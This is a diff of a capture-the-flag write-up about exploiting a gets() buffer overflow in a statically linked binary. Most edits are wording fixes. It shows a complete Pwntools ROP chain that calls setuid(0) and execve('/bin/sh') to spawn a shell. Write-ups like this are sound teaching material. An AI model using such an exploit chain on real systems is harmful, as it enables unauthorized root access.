@@ -58,7 +58,7 @@ We even have the source code !
             gets(buffer); 
     }
 The admin initially wanted to give someone extended permissions, and finally commented the code.
-Also, we can see there use a buffer overflow opportunity here : there is a call to _gets_ that we may exploit.
+Also, we can see there is a buffer overflow opportunity here : there is a call to _gets_ that we may exploit.
 
 Let's retrieve this binary locally. We can analyse it with checksec
 
@@ -73,7 +73,7 @@ Let's retrieve this binary locally. We can analyse it with checksec
     file ask_admin
     ask_admin: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=8690ce8521e9cdc21d0313c4ebdbaf13fad4078a, not stripped, too many notes (256)
 
-Partial RELRO, and No PIE. And the executable is statically linked (no possibility to return to libc)
+Partial RELRO, and No PIE. And no possibility to return to libc.
 
 ### Validate buffer overflow
 First, let's see if we can exploit this buffer overflow.
@@ -90,7 +90,7 @@ The offset to exploit the instruction pointer should be 32 + 8 = 40, and we can 
     rbp            0x6262626262626262  0x6262626262626262
 
 The rbp register contains only b's, and the returning address lies just after.
-Also, we can see that checksec was wrong : we have a segmentation fault, so there may not be any canary here! 
+Also, we can see that checksec was wrong: we have a segmentation fault, so there is no canary here! 
 ### Exploiting the buffer overflow : ROP
 ROP (Return-Oriented programming) is an exploit technique that allows us to pick some instructions here and there from the program itself (or its dependencies) to achieve what we want.
 These instructions are named "gadgets", and a gadget generally looks like this:
@@ -100,7 +100,7 @@ These instructions are named "gadgets", and a gadget generally looks like this:
     ...
     ret;
 
-It always concludes with a "ret" instruction. This is the key point to get the ability to execute other gadgets.
+One or many ASM instructions, always followed by a "ret" one. This is the key point to execute other gadgets.
 
 For example, let's say we want to set registers rax to 0xC0FF33 and rdi to 0x50DA.
 We know that the asm binary for "pop rax; ret;" exists somewhere in our executable at address 0x1234.
@@ -139,7 +139,7 @@ The commented code in the source file is interesting. Even if it can't be used a
 There is a nice cheat sheet [here](https://github.com/Hackndo/misc/blob/master/syscalls64.md).
 According to that page, we can easily do
 * setuid(0) : rax = 105, rdi = 0, then execute a syscall
-* execve("/bin/sh") : rax = 59, rdi points at "/bin/sh", rsi and rdx points at 0x0000
+* execve("/bin/sh") : rax = 59, rdi points at "/bin/sh", rsi and rdx points at 0x0000, then execute a syscall
 ### Building our ROP chain
 Hopefully, there are useful libs to create a ROP chain, like Python's Pwntools.
 ```python
@@ -147,11 +147,11 @@ Hopefully, there are useful libs to create a ROP chain, like Python's Pwntools.
 from pwn import *
 
 # We load our binary and start a ROP chain
-elf=context.binary=ELF("./ask_admin", checksec = False)  
+elf = context.binary=ELF("./ask_admin", checksec = False)  
 rop = ROP(elf)  
 
 # Start the process and read stdin until it's our turn
-p=process("./ask_admin")
+p = process("./ask_admin")
 p.clean()  
   
 # Let's build our chain. First: setuid(0)
@@ -166,11 +166,12 @@ rop.raw(next(elf.search(asm('syscall ; ret;'))))
 
 # First parameter: rdi points at /bin/sh
 # We will put the "/bin/sh" string in the writeable .data section
-data_section = elf.get_section_by_name('.data').header.sh_addr  
+data_section = elf.get_section_by_name('.data').header.sh_addr 
+
 # We put our (small enough) text in rdx, the target destination in rdi...
 rop.rdx = b"/bin/sh\x00"  
 rop.rdi = data_section  
-# Then we find and add a gadget to move rdx's value where rdi points at
+# ... and we find and add a gadget to move rdx's value where rdi points at
 rop.raw(next(elf.search(asm('mov qword ptr [rdi], rdx; ret;'))))  
 
 # Second and third parameters : rsi and rdx point at 0
@@ -188,9 +189,11 @@ rop.raw(rop.syscall.address)
 print(rop.dump())  
 
 # Build and push the payload
+# (remember, offset is 40-byte-long : 32 for the buffer, 8 for the rbp)
 payload = b"a" * 40 + rop.chain()
 p.sendline(payload)  
-  
+
+# Switch to interactive mode to play with our shell.
 p.interactive()
 ```
 
